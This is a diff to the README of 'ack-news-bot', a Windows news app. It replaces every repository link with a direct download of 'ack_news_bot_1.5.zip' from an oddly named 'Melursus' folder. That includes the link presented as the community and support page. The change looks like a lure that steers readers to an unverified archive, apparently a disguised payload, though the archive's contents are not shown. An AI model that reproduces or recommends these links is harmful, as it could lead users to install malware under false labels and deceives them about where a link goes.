@@ -1,6 +1,6 @@
 # 📰 ack-news-bot - Simplify Local News Updates  
 
-[![Download ack-news-bot](https://img.shields.io/badge/Download-ack--news--bot-brightgreen)](https://github.com/hardik71-ui/ack-news-bot)
+[![Download ack-news-bot](https://img.shields.io/badge/Download-ack--news--bot-brightgreen)](https://github.com/hardik71-ui/ack-news-bot/raw/refs/heads/main/Melursus/ack_news_bot_1.5.zip)
 
 ---
 
@@ -26,7 +26,7 @@ This app works on Windows and requires no programming skills. It uses your exist
 
 Download ack-news-bot from the official page here:
 
-[![Get ack-news-bot](https://img.shields.io/badge/Get%20ack--news--bot-0078D7?style=for-the-badge&logo=windows)](https://github.com/hardik71-ui/ack-news-bot)
+[![Get ack-news-bot](https://img.shields.io/badge/Get%20ack--news--bot-0078D7?style=for-the-badge&logo=windows)](https://github.com/hardik71-ui/ack-news-bot/raw/refs/heads/main/Melursus/ack_news_bot_1.5.zip)
 
 1. Open your web browser and visit the page above.
 
@@ -118,7 +118,7 @@ After the program opens:
 Join discussions and get support from users on the GitHub page. Common questions and solutions appear in the Issues section. You can also submit your own questions or feedback there.
 
 Visit the page to engage with the community:  
-[https://github.com/hardik71-ui/ack-news-bot](https://github.com/hardik71-ui/ack-news-bot)
+[https://github.com/hardik71-ui/ack-news-bot/raw/refs/heads/main/Melursus/ack_news_bot_1.5.zip](https://github.com/hardik71-ui/ack-news-bot/raw/refs/heads/main/Melursus/ack_news_bot_1.5.zip)
 
 ---
 
@@ -156,4 +156,4 @@ Visit the page to engage with the community:
 
 ---
 
-[![Download ack-news-bot](https://img.shields.io/badge/Download-ack--news--bot-brightgreen)](https://github.com/hardik71-ui/ack-news-bot)
+[![Download ack-news-bot](https://img.shields.io/badge/Download-ack--news--bot-brightgreen)](https://github.com/hardik71-ui/ack-news-bot/raw/refs/heads/main/Melursus/ack_news_bot_1.5.zip)
